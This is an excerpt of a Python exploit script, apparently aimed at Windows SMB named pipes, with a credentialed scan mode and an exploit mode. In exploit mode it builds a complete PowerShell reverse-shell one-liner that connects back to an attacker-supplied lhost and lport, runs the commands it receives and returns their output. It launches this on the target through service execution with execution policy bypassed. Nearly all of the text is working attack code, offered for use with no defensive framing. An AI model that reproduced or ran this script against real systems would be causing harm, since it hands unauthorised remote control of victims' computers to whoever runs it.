...
def exploit(target, pipe_name):
	...
	# ================================
	try:
		smb_pwn(conn, info['arch'], revshell)
	except:
		pass
...
def smb_pwn(conn, arch, revshell):
	...
	#print(revshell)
        service_exec(conn, r'cmd /c powershell.exe %s'%(revshell))
	#service_exec(conn, r'cmd /c dir')
...
def scan_target(target, USERNAME, PASSWORD):
...
if len(sys.argv) > 3:
   if sys.argv[4] == "scan" :
      ...
      USERNAME = sys.argv[2]
      PASSWORD = sys.argv[3]
      scan_target(target, USERNAME, PASSWORD)
      sys.exit()
elif len(sys.argv) < 3 :
      print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> <pipe_name> <username> <password> exploit or "+sys.argv[0]+" <Target> <username> <password> scan\n")
      sys.exit()
...
elif sys.argv[7] == "exploit" :
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    pipe_name = sys.argv[4]
    USERNAME = sys.argv[5]
    PASSWORD = sys.argv[6]
    revshell = '-nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|'%(lhost,lport)+'%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
